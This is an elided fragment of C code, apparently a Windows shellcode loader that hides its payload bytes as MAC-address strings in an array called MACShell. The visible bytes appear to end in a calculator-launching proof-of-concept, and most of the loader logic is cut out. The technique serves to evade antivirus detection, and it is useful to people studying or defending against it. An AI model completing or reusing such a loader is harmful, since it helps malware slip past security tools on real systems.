...
const char* MACShell[] = {
	...
	"D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0", "75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-00-90-90-90-90"
};
...
int main() {
	...
	getchar();
	VirtualFree(LpBaseAddress, sizeof(MACShell), MEM_DECOMMIT);
	return 0;
